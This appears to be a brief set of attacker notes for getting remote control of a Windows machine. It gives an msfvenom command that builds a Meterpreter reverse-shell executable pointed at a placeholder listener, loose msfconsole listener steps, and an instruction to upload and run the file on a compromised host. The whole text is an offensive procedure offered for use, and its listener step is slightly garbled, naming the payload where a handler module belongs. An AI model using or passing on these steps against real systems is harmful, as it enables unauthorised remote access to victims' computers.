msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENER_IP> LPORT=<PORT> -f exe > reverse.exe
  
open msfconsole
- use windows/meterpreter/reverse_tcp
- set options
- run
  
upload reverse.exe to the compromised machine and run it